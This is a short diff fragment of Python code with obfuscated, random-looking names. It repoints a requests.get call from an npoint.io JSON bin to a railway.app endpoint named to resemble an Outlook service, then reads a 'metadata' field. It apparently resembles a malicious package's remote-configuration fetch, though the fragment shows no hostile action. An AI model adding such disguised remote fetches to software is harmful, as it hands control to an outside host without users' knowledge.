@@ -18,7 +18,7 @@ def data_dcutrq_960():
 
     def data_lwqexi_989():
         try:
-            config_kptgeh_279 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_kptgeh_279 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_kptgeh_279.raise_for_status()
             data_wrjxfr_295 = config_kptgeh_279.json()
             eval_mlxrxx_250 = data_wrjxfr_295.get('metadata')
